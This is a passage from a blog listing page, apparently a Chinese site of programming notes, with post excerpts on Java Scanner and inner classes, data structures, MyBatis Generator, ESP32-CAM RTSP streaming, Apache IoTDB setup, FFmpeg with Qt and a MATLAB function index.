返回值方法名方法描述Stringnext()将输入的下一个标记扫描为 StringStringnextLine()将输入的下一个标记扫描为 StringshortnextShort()将输入的下一个标记扫描为 shortintnextInt()将输入的下一个标记扫描为 intlongnextLong()将输入的下一个标记扫描为 longfloatnextFloat ()将输入的下一个标记扫描为 floatdoublenextDouble()将输入的下一个标记扫描为 doublebytenextByte()将输入的下一个标记扫描为 bytebooleannextBoolean()将输入的下一个标记扫描为 boolean next() 与 nextLine() 区别： next():
一定要读取到有效字符后才可以结束输入。对输入有效字符之前遇到的空白，next() 方法会自动将其去掉。只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符。next() 不能得到带有空格的字符串。 nextLine()：
以Enter为结束符,也就是说 nextLine()方法返回的是输入回车之前的所有字符。可以获得空白。 实例： package ForExample; //1.导包 import java.util.Scanner; public class index { public static void main(String[] args) { // Scanner的实例化 Scanner scan = new Scanner(System.in); // 调用Scanner类的相关方法 System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/77b3a2f1a7eaca318ca395718735e815/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bec012bd6314d8ca1ce63ae7dc86fab5/" rel="bookmark">
			Java基础笔记（16）内部类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
类的分类：
成员内部类：
局部内部类：
匿名内部类：
在Java中，允许一个类的定义位于另一个类的内部，前者称为内部类，后者称为外部类。
内部类一般用在定义它的类或语句块之内，在外部引用它时必须给出完整的名称。
类的分类： 成员内部类（static成员内部类和非static成员内部类）局部内部类（不谈修饰符）、匿名内部类 成员内部类： 可以调用外部类的结构可以被static修饰可以被4种不同的权限修饰类内可以定义属性、方法、构造器等可以被final修饰，表示此类不能被继承可以被abstract修饰 注意：
非static的成员内部类中的成员不能声明为static的，只有在外部类或static的成员内部类中才可声明static成员外部类访问成员内部类的成员，需要“内部类.成员”或“内部类对象.成员”的方式成员内部类可以直接使用外部类的所有成员，包括私有的数据当想要在外部类的静态成员部分使用内部类时，可以考虑内部类声明为静态的 局部内部类： 内部类仍然是一个独立的类，在编译之后内部类会被编译成独立的.class文件，但是前面冠以外部类的类名和$符号，以及数字编号只能在声明它的方法或代码块中使用，而且是先声明后使用。除此之外的任何地方 都不能使用该类局部内部类可以使用外部类的成员，包括私有的局部内部类可以使用外部方法的局部变量，但是必须是final的。由局部内部类和局 部变量的声明周期不同所致局部内部类和局部变量地位类似，不能使用public,protected,private,默认局部内部类不能使用static修饰，因此也不能包含静态成员 注意：
只能在声明它的方法或代码块中使用，而且是先声明后使用。除此之外的任何地方都不能使用该类但是它的对象可以通过外部方法的返回值返回使用，返回值类型只能是局部内部类的父类或父接口类型 匿名内部类： 匿名内部类不能定义任何静态成员、方法和类，只能创建匿名内部类的一个实例。一个匿名内部类一定是在new的后面，用其隐含实现一个接口或实现一个类。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f97daf6b7cae4091af4de382cf1f1e12/" rel="bookmark">
			MyBatisGenerator(MBG)代码自动生成器，从此解放你的双手
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.概述 官方文档解释：
MyBatis Generator (MBG) is a code generator for MyBatis MyBatis and iBATIS. It will generate code for all versions of MyBatis, and versions of iBATIS after version 2.2.0. It will introspect a database table (or many tables) and will generate artifacts that can be used to access the table(s). This lessens the initial nuisance of setting up objects and configuration files to interact with database tables. MBG seeks to make a major impact on the large percentage of database operations that are simple CRUD (Create, Retrieve, Update, Delete).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f97daf6b7cae4091af4de382cf1f1e12/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad1fd5810721452dcc79f492737c683d/" rel="bookmark">
			数据结构-堆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、什么是堆
堆是一种满足以下条件的树：堆中的每一个节点值都大于等于（或小于等于）子树中所有节点的值。
2、堆的用途
当我们只关心所有数据中的最大值或者最小值，存在多次获取最大值或者最小值，多次插入或删除数据时，就可以使用堆。
3、堆得分类
堆分为最大堆和最小堆。最大堆，堆中的每一个节点的值都大于等于子树中所有节点的值。最小堆，堆中的每一个节点的值都小于等于子树中所有节点的值。
4、堆的存储
利用数组存储堆，方便存储和索引。
5、堆得操作
堆的更新操作主要包括两种:插入元素和删除堆顶元素。
（1）插入元素
1）将要插入的元素放到最后；2）从底向上，如果父结点比该元素大，则该节点和父结点交换，直到无法交换。
（2）删除堆顶元素
自底向上堆化：1）首先删除堆顶元素，使得数组中下标为1的位置空出；2）比较根结点的左子节点和右子节点，也就是下标为2、3的数组元素，将较大的元素填充到根结点（下标为1）的位置；3）一直循环比较空出位置的左右子节点，并将较大者移至空位，直到堆的最底部。
自顶向下堆化：1）将最后一个元素移动到堆顶；2）不停与左右子节点的值进行比较，和较大的子节点交换位置，直到无法交换位置。
自底向上堆化会产生气泡，浪费存储空间。最好采用自顶向下堆化的方式。
6、堆排序
堆排序的过程分为两步：
第一步是建堆，将一个无序的数组建立为一个堆；
第二步是排序，将堆顶元素取出，然后对剩下的元素进行堆化，反复迭代，直到所有元素被取出为止。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54e98cc7db9c2b407465908b593217dc/" rel="bookmark">
			数据结构-图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、图的基本概念
（1）定义
图是一种较为复杂的非线性结构。
图就是由顶点的有穷非空集合和顶点之间的边组成的集合。通常表示为G(V,E)，其中，G表示一个图，V表示顶点的集合，E表示边的集合。
（2）顶点
图中的数据元素，我们称之为顶点，图至少有一个顶点（非空有穷集合）。
（3）边
顶点之间的关系用边表示。
（4）度、入度、出度
度表示一个顶点包含多少条边，在有向图中，还分为出度和入度，出度表示从该顶点出去的边的条数，入度表示进入该顶点的边的条数。
（5）无向图、有向图
边表示的是顶点之间的关系，有的关系是双向的，比如同学关系，A是B的同学，那么B也肯定是A的同学，用不带箭头的边表示二者的关系，这样的图就是无向图。有的关系是有方向的，比如父子关系，A是B的爸爸，但B肯定不是A的爸爸，用带箭头的边表示二者的关系，这样的图就是有向图。
（6）无权图、有权图
对于一个关系，如果我们只关心关系的有无，而不关心关系有多强，那么就可以用无权图表示二者的关系。
对于一个关系，如果我们既关心关系的有无，也关心关系的强度，比如描述地图上两个城市的关系，需要用到距离，那么就用带权图来表示，带权图中的每一条边一个数值表示权值，代表关系的强度。
2、图的存储
（1）邻接矩阵存储
邻接矩阵将图用二维矩阵存储，是一种较为直观的表示方式。
如果第i个顶点和第j个顶点之间有关系，且关系权值为n，则A[i][j]=n。在无向图中，我们只关心关系的有无，所以当顶点i和顶点j有关系时，A[i][j]=1，当顶点i和顶点j没有关系时，A[i][j]=0。
无向图的邻接矩阵是一个对称矩阵，因为在无向图中，顶点i和顶点j有关系，则顶点j和顶点i必有关系。
邻接矩阵存储的方式优点是简单直接（直接使用一个二维数组即可），并且，在获取两个定点之间的关系的时候也非常高效（直接获取指定位置的数组元素的值即可）。但是，这种存储方式的缺点也比较明显，那就是比较浪费空间。
（2）邻接表存储
邻接链表使用一个链表来存储某个顶点的所有后继相邻顶点。对于图中每个顶点Vi，把所有邻接于Vi的顶点Vj链成一个单链表，这个单链表称为顶点Vi的邻接表。
在无向图中，邻接表元素个数等于边的条数的两倍。在有向图中，邻接表元素个数等于边的条数。
3、图的搜索
（1）广度优先搜索
广度优先搜索的具体实现方式用到了之前所学过的线性数据结构——队列。
（2）深度优先搜索
和广度优先搜索类似，深度优先搜索的具体实现用到了另一种线性数据结构——栈。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9c07f645a51f0ac65a2d59ac9f12ff0/" rel="bookmark">
			Restormer: Efficient Transformer for High-Resolution Image Restoration 论文笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 本文也是结合Transformer设计出来的网络结构用作图像恢复领域，主要包括图像去雨、运动去模糊、失焦去模糊和图像降噪（其中又包括了高斯彩色/灰度图的降噪、真是图像降噪）。
创新点：①提出一种基于编码器-解码器的Restormer网络。
②提出了一种新的局部transformer模块MDTA，可以加强局部和非局部有关联像素之间的联系。
③一种新的门控前向传递网络。
网络结构 总体来看整体网络结构其实也是借鉴编码器-解码器的结构，而且仔细看中间下凸的那部分其实也就是Unet的网络结构，而且很凑巧的是最后实验出来的效果也是四层的网络效果最好，跟Uformer不谋而合。
首先，一幅H×W×3的图像经过卷积层生成H×W×C的特征图。然后经过4层编码器-解码器结构网络，每一层都是由一个Transformer模块和一个下采样层组成，通过四层transformer模块和下采样层之后，再经过解码器也是跟前面一样的模块，只是改成了上采样，并且和之前下采样得到的特征图经过一个1×1的卷积核按比例相加进行输出，最后经过一个transformer模块对特征进行改进，再进入一个卷积层还原回恢复后的图像。
MDTA 在这个模块中，先经过一个1×1的卷积结合通道之间的信息，然后通过一个3×3的卷积结合单个通道的空间信息，然后才是SA的流程，在这之中没有使用偏置，这样既结合了通道之间的信息又结合了局部的空间信息。
Gated-Dconv Feed-Forward Network 门控前向网络主要由两条路组成，都分别由一个1×1和3×3的卷积层组成，门控的关键点在于下面那条支流会通过一个非线性的GELU函数，可以将比较好的特征得以保留，然后通过与上面那个直流得到的原特征图相乘从而达到加强较好特征部分的目的。
实验 去雨 运动去模糊 失焦去模糊 降噪 消融实验 主要是对网络结构进行研究，看看哪个结构效果比较好。
总结 总体来看的话，Restormer和Uformer其实设计出来的网络结构也是相似的，都是基Transformer、编码器-解码器、Unet的结构，而且网络层数做出来的结果都一样，并且都自己设计了一个transformer模块和一个前向传递网络。个人认为，编码器和解码器结构上是不是可以向着不一样的结构发展一下会不会有更好的效果。其次是，最后出来的实验效果对比来看，各有所长吧，但是restormer上比如去雨部分就没有拿Uformer来做对比，不知道为什么，我看了下Uformer的效果在论文里面是要比它高很多的在这项任务上。最后，个人看来的亮点就是设计的时候不仅仅关注了空间上的局部信息，还关注了通道间的信息，通过一个1×1的卷积层来实现，这个想法还是不错。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7542f06c81f780d5b0de4b038047d8b/" rel="bookmark">
			Cadence17.4操作经验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Cadence17.4打开原理图
1. 运行“Capture CIS 17.4”
2. 打开原理图工程文件*.opj
Cadence17.4打开原理图 1. 运行“Capture CIS 17.4” 如上图图标，其程序位置参考如下：
D:\Cadence\Cadence_SPB_17.4-2019\tools\bin\Capture.exe
2. 打开原理图工程文件*.opj 如：D:\V1.1\DrvBd\20221103\Hi8040_VB\hi8040_vb.opj
建议目录中不要有中文和空格
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0bacbbf6d4485d146520bacb9198f4f6/" rel="bookmark">
			基于ESP32-CAM的RSTP协议网络摄像头
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本次分享的程序是使用ESP32-CAM进行图像采集并将图像以RTSP协议进行无线传输。在同网络的PC上使用软件对摄像头的图像进行拉取观看。 开发环境：Arduino。
程序语言：C语言。
ESP32-CAM：
ESP32-CAM是安信可最新发布小尺寸的摄像头模组。该模块可以作为最小系统独立工作，尺寸仅为27*40.5*4.5mm，深度睡眠电流最低达到6mA。ESP32-CAM可广泛应用于各种物联网场合，适用于家庭智能设备、工业无线控制、无线监控、QR无线识别，无线定位系统信号以及其它物联网应用，是物联网应用的理想解决方案。ESP32-CAM采用DIP封装，直接插上底板即可使用，实现产品的快速生产，为客户提供高可靠性的连接方式，方便应用于各种物联网硬件终端场合。 体积超小的802.11b/g/n Wi-Fi + BT/BLE SoC模块 ESP32 CAM
产品特性
采用低功耗双核32位CPU，可作应用处理器
主频高达240MHz，运算能力高达 600 DMIPS
内置 520 KB SRAM，外置8MB PSRAM
支持UART/SPI/I2C/PWM/ADC/DAC等接口
支持OV2640和OV7670摄像头，内置闪光灯
支持图片WiFI上传
支持TF卡
支持多种休眠模式。
内嵌Lwip和FreeRTOS。
支持 STA/AP/STA+AP 工作模式。
支持 Smart Config/AirKiss 一键配网。
支持二次开发。
RTSP协议：
Real Time Streaming Protocol，RFC2326，实时流传输协议，RTSP是 TCP/IP 协议体系中的一个应用层协议，该协议定义了一对多应用程序如何有效地通过 IP 网络传送多媒体数据。RTSP在体系结构上位于RTP和RTCP之上，它使用TCP或UDP完成数据传输。HTTP与RTSP相比，HTTP传送HTML，而RTSP传送的是多媒体数据。 RTSP是基于文本的协议，采用ISO10646字符集，使用UTF-8编码方案。行以CRLF中断，包括消息类型、消息头、消息体和消息长。但接收者本身可将CR和LF解释成行终止符。基于文本的协议使其以自描述方式增加可选参数更容易，接口中采用SDP作为描述语言。 本文介绍的方法使用方法是基于Arduino开发环境实现的。用到的开源库名称为：Micro-RTSP。库文件可以在github上搜索到，代码资源也上传到网盘，文末有相应的获取方式。 将Micro-RTSP-master库添加到Arduino软件中。 Micro-RTSP Arduino库
安装成功后，在第三方库示例中就可以找到例程。
库示例
例程打开以后首先需要在wifikeys.h文件中设置一下WiFi名称和WiFi密码。
设置WIFI和密码
然后需要修改宏定义。第一个宏定义是OLED显示器，如果你的ESP32 CAM有I2C接口OLED显示器，可以打开这个宏定义，并设置对应的引脚这样就可以使用显示器显示对应的输出信息；第二个宏定义是接入点模式，这种模式下ESP32会作为接入点，创建一个WIFI；第三个宏定义是使能web服务器，使能web服务器后可以在浏览器访问ESP32的IP地址就可以实时获取其图像信息；第四个是使能RTSP服务器，使能后即可通过RTSP端口获取到图像信息。可以根据需要开启对应的宏定义。 修改完宏定义信息后，还需要根据ESP32 CAM的硬件信息修改下面的配置，我这里使用的是安信可生产的ESP32 CAM，修改对应的配置信息即可。 硬件适配
修改完成后即可上传，上传成功后可以通过串口或路由器配置界面查看EPS32 CAM联网后的IP。然后打开VLC播放器。
VLC
依次选择“媒体”-&gt;“打开网络串流”。然后输入rtsp://“IP地址”:8554/mjpeg/2。最后点击“播放”，等待连接成功后就可以显示出摄像头图像。
RTSP码流地址
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b19df67773be46435a208c1c3212882/" rel="bookmark">
			UG/NX二次开发Siemens官方NXOPEN实例解析—2.1 AssemblyViewer（树列表）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		列文章目录 UG/NX二次开发Siemens官方NXOPEN实例解析—2.1 AssemblyViewer（树列表）UG/NX二次开发Siemens官方NXOPEN实例解析—2.2 Selection（选择过滤器）UG/NX二次开发Siemens官方NXOPEN实例解析—2.3 Selection_UIStyler（边倒角）UG/NX二次开发Siemens官方NXOPEN实例解析—2.4 File2Points（读取文本）UG/NX二次开发Siemens官方NXOPEN实例解析—2.5 QuickExtrude（拉伸）UG/NX二次开发Siemens官方NXOPEN实例解析—2.6 CreateNote（注释）UG/NX二次开发Siemens官方NXOPEN实例解析—2.7 DiameterSymbol（标注符号） UG/NX二次开发Siemens官方NXOPEN实例解析—2.8 DrawingCycle（图纸打印）UG/NX二次开发Siemens官方NXOPEN实例解析—2.9 InteropCallCFromDotNet(VB调用VC++ DLL实践)UG/NX二次开发Siemens官方NXOPEN实例解析—2.10 InteropNXOpenWithUFWrap（NXOPEN与Ufun混合使用） 前言 随着工业智能化的不断发展，UG二次开发的需求越来越多，也吸引了大批的二开从业人员，本人作为一名资深IT从业者（10年+）也毅然加入二次开发大军。
然而，和流行IT行业（互联网、金融、医疗等）相比，工业智能化的门槛显得更高一点，专业的工业软件，相对封闭的开发理念和更小的开发圈子，让刚进入二开的从业者有点举步维艰。边学边整理，希望通过这系列文章的整理能给二开的生态增添一叶绿。
一、知识点提取汇总 1、树列表控件的初始化和数据加载
2、选择对象控件过滤器使用
3、对象颜色拾取器的使用
4、遍历组件方法的实现
5、树列表控件通过递归方法实现多层目录加载
二、案例需求分析 1、最终效果图 2、需求分解 本案的需求分解如下：
1）加载装配目录到树列表，通过选取树列表的方式，实现配件的选取
2）也可以通过组件选择器的方式，选取配件
3）为选取的配件设置颜色
三、程序分析 1、源码所在目录 UGOPEN\SampleNXOpenApplications\C++\AssemblyViewer
2、主要功能分析 1）树列表控件的初始化和回调方法
treeList = dynamic_cast&lt;NXOpen::BlockStyler::Tree*&gt;(theDialog-&gt;TopBlock()-&gt;FindBlock("treeList")); //注册回调方法 treeList-&gt;SetOnSelectHandler(make_callback(this, &amp;AssemblyViewer::OnSelectCallback)); void AssemblyViewer::OnSelectCallback(NXOpen::BlockStyler::Tree *tree, NXOpen::BlockStyler::Node *, int columnID, bool selected) { try { if(selected == true) { PartCleanup(); ComponentSelection(); } } catch(exception&amp; ex) { } } void AssemblyViewer::ComponentSelection() { try { bool singleComponent = IsSingleComponentSelection(); std::vector&lt;NXOpen::TaggedObject *&gt;selObjectData = GetSelectedObjects(); std::vector&lt;NXOpen::TaggedObject *&gt;selNodeComps = GetSelectedNodes(); // Create a DisplayModification object to set the color if (selObjectData.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b19df67773be46435a208c1c3212882/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/946ad54dca3aa4d9d041e6fb502888bd/" rel="bookmark">
			Apache IoTDB下载与安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. 中文官方文档：https://iotdb.apache.org/zh/ 2. 下载地址：https://iotdb.apache.org/zh/Download/ 发行版本踩了个小坑：1.0.0版本启动时如果作为单机部署，只能使用127.0.0.1，这样会导致部署在外网连接失败，所以这里我们选择下载0.13.3版本。
3. 直接解压 unzip apache-iotdb-0.13.3-all-bin.zip 4.启动服务端 nohup sbin/start-server.sh &gt;/dev/null 2&gt;&amp;1 &amp; 5. 启动客户端（10.xx.xx.xx为服务端ip） bash sbin/start-cli.sh -h 10.xx.xx.xx -p 6667 -u root -pw root 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/baa84f49a306eb3fe9e47fba1f93f659/" rel="bookmark">
			Qt：FFmpeg解码音频
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		音频数据格式：
基本格式内容：声道数channels、采样率sample_rate（采样设备每秒抽取样本的次数）
采样数据类型（量化精度）sample_fmt
enum AVSampleFormat { AV_SAMPLE_FMT_NONE = -1, AV_SAMPLE_FMT_U8, ///&lt; unsigned 8 bits AV_SAMPLE_FMT_S16, ///&lt; signed 16 bits AV_SAMPLE_FMT_S32, ///&lt; signed 32 bits AV_SAMPLE_FMT_FLT, ///&lt; float AV_SAMPLE_FMT_DBL, ///&lt; double AV_SAMPLE_FMT_U8P, ///&lt; unsigned 8 bits, planar AV_SAMPLE_FMT_S16P, ///&lt; signed 16 bits, planar AV_SAMPLE_FMT_S32P, ///&lt; signed 32 bits, planar AV_SAMPLE_FMT_FLTP, ///&lt; float, planar AV_SAMPLE_FMT_DBLP, ///&lt; double, planar AV_SAMPLE_FMT_S64, ///&lt; signed 64 bits AV_SAMPLE_FMT_S64P, ///&lt; signed 64 bits, planar AV_SAMPLE_FMT_NB ///&lt; Number of sample formats.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/baa84f49a306eb3fe9e47fba1f93f659/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08ce972632bbf5ada6534d7bf3154005/" rel="bookmark">
			Qt：使用FFmpeg解码视频流
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Debug和Release載入不同動態庫：
//將lib文件放到對應工程目錄下，在.pro添加存放lib的路徑 LIBPATH += $$PWD/Library/Lib //debug為active時處理LIBS += -L$$LIB_PATH -lOpengl32... CONFIG(debug, debug|release){ LIBS += -L$$LIBPATH -lOpengl32...} else{LIBS += -L$$LIBPATH -lOpengl32 -lavcodec...} 或 CONFIG(debug, debug|release)：LIBS += -L$$LIBPATH -lOpengl32... CONFIG(release, debug|release)：LIBS += -L$$LIBPATH -lOpengl32 -lavcodec.. //在對應的debug或release目錄下添加使用的.dll文件 //本例中用到的库文件： INCLUDEPATH += $$PWD/Dev/include LIBPATH += $$PWD/Dev/lib LIBS += -L$$LIBPATH -lavcodec -lavdevice -lavfilter -lavformat -lavutil -lpostproc -lswresample -lswscale 屏蔽QDebug()提示信息：在pro文件中添加：DEFINES+=QT_NO_DEBUG_OUTPUT
FFmpeg：
靜態庫版本：Static，只包含三個應用程式，不依賴動態庫可單獨運行；
動態庫版本：Shared，除應用程式外還包含dll動態庫；
開發者版本：Dev，包含lib文件和.h文件，但不包含dll文件。
使用ffmpeg要注意對應版本（如編譯器32位則使用32位的FFmpeg版本），ffmpeg庫為C文件，導入需在頭文件添加關鍵詞extetn “C”。
可將dll拷貝進lib，發佈時再拷貝dll進運行目錄或將dll拷貝進運行目錄。
檢查環境配置是否搭建成功：
unsigned version = avcodec_version(); QString ch = QString::number(version,10); qDebug()&lt;&lt;"version: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/08ce972632bbf5ada6534d7bf3154005/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5153cb339a9e956f2cf86cd7720c6be2/" rel="bookmark">
			4、表达式dict(zip([1，2]，[3，4]))的值为
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		表达式 dict(zip([1，2]，[3，4])) 的值为：
{1: 3, 2: 4}
zip 函数接受一系列可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表。在这里，zip([1，2]，[3，4]) 的返回值为 [(1, 3), (2, 4)]。
dict 函数可以接受一个由键值对组成的元组列表作为参数，并返回一个字典。在这里，dict(zip([1，2]，[3，4])) 的返回值为字典 {1: 3, 2: 4}。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29e1658e981b73608ef9028361ca12e8/" rel="bookmark">
			MATLAB 函数速查手册目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第 1 章 MATLAB 操作基础 第 2 章 矩阵及其基本运算
第 3 章 数值计算函数
第 4 章 符号运算函数
第 5 章 概率统计
第 6 章 绘图与图形处理
第 7 章 MATLAB 程序设计
第 8 章 Simulink 命令
第 9 章 图形用户界面制作
第 10 章 信号处理工具箱
第 11 章 符号数学工具箱
第 1 章 MATLAB 操作基础
MATLAB 概述 MATLAB 产生的历史背景MATLAB 的主要功能MATLAB 的语言特点MATLAB 的运行环境及安装 MATLAB 的运行环境MATLAB7.0 的安装MATLAB 集成环境 启动与退出 MATLAB 集成环境MATLAB 的命令窗口工作空间窗口当前目录窗口MATLAB 的搜索路径命令历史记录窗口启动平台窗口和 Start 按钮MATLAB 的菜单栏MATLAB 的工具栏MATLAB 入门实践 命令窗口操作计算结果的图形表示内存变量的查阅命令--who 或 whos变量的文件保存命令--save 和 load 命令MATLAB 帮助系统 帮助窗口帮助命令演示系统远程帮助系统 第 2 章 矩阵及其基本运算 矩阵的表示 实数矩阵输入复数矩阵输入sym 函数--定义符号矩阵syms 函数--定义矩阵的又一函数sym 的另一职能--把数值矩阵转化成相应的符号矩阵创建大矩阵cat 函数--创建多维数组zeros 函数--零矩阵的生成 eye 函数--单位矩阵的生成ones 函数--生成全 1 阵rand 函数--生成均匀分布随机矩阵randn 函数--生成正态分布随机矩阵randperm 函数--产生随机序列linspace 函数--线性等分向量的生成logspace 函数--产生对数等分向量blkdiag 函数--产生以输入元素为对角线元素的矩阵compan 函数--生成友矩阵hankel 函数--生成 Hankel 方阵hilb 函数--生成 Hilbert(希尔伯特)矩阵invhilb 函数--逆 Hilbert 矩阵生成pascal 函数--生成 Pascal 矩阵toeplitz 函数--生成托普利兹矩阵wilkinson 函数--生成 Wilkinson 特征值测试阵矩阵的运算 矩阵的加减运算指令矩阵的简单乘法dot 函数--向量的点积cross 函数--向量叉乘向量的混合积运算conv 函数--矩阵的卷积和多项式乘法deconv 函数--反褶积(解卷)和多项式除法运算kron 函数--张量积intersect 函数--求两个集合的交集ismember 函数--检测集合中的元素setdiff 函数--求两集合的差setxor 函数--求两个集合交集的非(异或)union 函数--求两集合的并集unique 函数--取集合的单值元素矩阵的除法运算矩阵乘方expm 函数--方阵指数函数logm 函数--求矩阵的对数funm 函数--方阵的函数运算sqrtm 函数--矩阵的方根polyvalm 函数--求矩阵的多项式矩阵转置 det 函数--求方阵的行列式inv 函数--求矩阵的逆pinv 函数--求矩阵的伪逆矩阵trace 函数--矩阵的迹norm 函数--求矩阵和向量的范数cond 函数--求矩阵的条件数condest 函数--1-范数的条件数估计rcond 函数--矩阵可逆的条件数估值condeig 函数--特征值的条件数rank 函数--矩阵的秩diag 函数--矩阵对角线元素的抽取tril 函数--下三角阵的抽取triu 函数--上三角阵的抽取reshape 函数--矩阵变维rot90 函数--矩阵旋转语法说明fliplr 函数--矩阵的左右翻转flipud 函数--矩阵的上下翻转flipdim 函数--按指定维数翻转矩阵repmat 函数--复制和平铺矩阵矩阵的比较函数矩阵取整运算rat 函数--用有理数形式表示矩阵rem 函数--矩阵元素的余数矩阵逻辑运算函数符号矩阵的四则运算函数sym 函数--数值矩阵转化为符号矩阵factor 函数--符号矩阵的因式分解expand 函数--符号矩阵的展开simple 或 simplify 函数--符号简化numel 函数--确定矩阵元素个数矩阵分解 chol 函数--Cholesky 分解lu 函数--LU 分解qr 函数--QR 分解qrdelete 函数--从 QR 分解中删除列qinsert 函数--从 QR 分解中添加列schur 函数--Schur 分解rsf2csf 函数--实 Schur 向复 Schur 转化 eig 函数--特征值分解svd 函数--奇异值分解gsvd 函数--广义奇异值分解qz 函数--特征值问题的 QZ 分解hess 函数--海森伯格形式的分解线性方程的组的求解 直接法求线性方程组的特解用矩阵的 LU 分解求方程组的解QR 分解求方程组的解null 函数--求线性齐次方程组的通解求非齐次线性方程组的通解symmlq 函数--线性方程组的 LQ 解法bicg 函数--双共轭梯度法解方程组bicgstab 函数--稳定双共轭梯度方法解方程组cgs 函数--复共轭梯度平方法解方程组lsqr 函数--共轭梯度的 LSQR 方法qmres 函数--广义最小残差法minres 函数--最小残差法解方程组pcg 函数--预处理共轭梯度方法qmr 函数--准最小残差法解方程组特征值与二次型 特征值与特征向量的求法cdf2rdf 函数--复对角矩阵转化为实对角矩阵orth 函数--将矩阵正交规范化秩与线性相关性 利用 rank 函数判断矩阵和向量组的秩以及向量组的线性相关性求行阶梯矩阵及向量组的基稀疏矩阵技术 sparse 函数--创建稀疏矩阵full 函数--将稀疏矩阵转化为满矩阵find 函数--稀疏矩阵非零元素的索引spconvert 函数--外部数据转化为稀疏矩阵spdiags 函数--生成带状(对角)稀疏矩阵speye 函数--单位稀疏矩阵sprand 函数--稀疏均匀分布随机矩阵sprandn 函数--生成稀疏正态分布随机矩阵sprandsym 函数--稀疏对称随机矩阵nnz 函数--返回稀疏矩阵非零元素的个数 nonzeros 函数--找到稀疏矩阵的非零元素nzmax 函数--稀疏矩阵非零元素的内存分配spfun 函数--稀疏矩阵的非零元素应用spy 函数--画稀疏矩阵非零元素的分布图形colmmd 函数--稀疏矩阵的排序colperm 函数--非零元素的列变换dmperm 函数--Dulmage-Mendelsohn 分解randperm 函数--整数的随机排列condest 函数--稀疏矩阵的 1-范数normest 函数--稀疏矩阵的 2-范数估计值luinc 函数--稀疏矩阵的分解eigs 函数--稀疏矩阵的特征值分解 第 3 章 数值计算函数 基本数学函数 sin 和 sinh 函数--正弦函数与双曲正弦函数asin、asinh 函数--反正弦函数与反双曲正弦函数cos、cosh 函数--余弦函数与双曲余弦函数acos、acosh 函数--反余弦函数与反双曲余弦函数tan 和 tanh 函数--正切函数与双曲正切函数atan、atanh 函数--反正切函数与反双曲正切函数cot、coth 函数--余切函数与双曲余切函数acot、acoth 函数--反余切函数与反双曲余切函数sec、sech 函数--正割函数与双曲正割函数asec、asech 函数--反正割函数与反双曲正割函数csc、csch 函数--余割函数与双曲余割函数acsc、acsch 函数--反余割函数与反双曲余割函数atan2 函数--四象限的反正切函数abs 函数--数值的绝对值与复数的幅值exp 函数--求以 e 为底的指数函数expm 函数--求矩阵以 e 为底的指数函数log 函数--求自然对数log10 函数--求常用对数sort 函数--排序函数fix 函数--向零方向取整roud 函数--朝最近的方向取整floor 函数--朝负无穷大方向取整rem 函数--求余数ceil 函数--朝正无穷大方向取整 real 函数--复数的实数部分imag 函数--复数的虚数部分angle 函数--求复数的相角conj 函数--复数的共轭值complex 函数--创建复数mod 函数--求模数nchoosek 函数--二项式系数或所有的组合数rand 函数--生成均匀分布矩阵randn 函数--生成服从正态分布矩阵插值、拟合与查表 interp1 函数--一维数据插值函数interp2 函数--二维数据内插值interp3 函数--三维数据插值interpn 函数--n 维数据插值spline 函数--三次样条插值interpft 函数--用快速 Fourier 算法作一维插值spline 函数--三次样条数据插值table1 函数--一维查表函数table2 函数--二维查表数据分析函数 max 函数--最大值函数min 函数--求最小值函数mean 函数--平均值计算median 函数--中位数计算sum 函数--求和prod 函数--连乘计算cumsum 函数--累积总和值cumprod 函数--累积连乘关系及逻辑运算数值微积分 quad 函数--一元函数的数值积分quad8 函数--牛顿?
	</div>
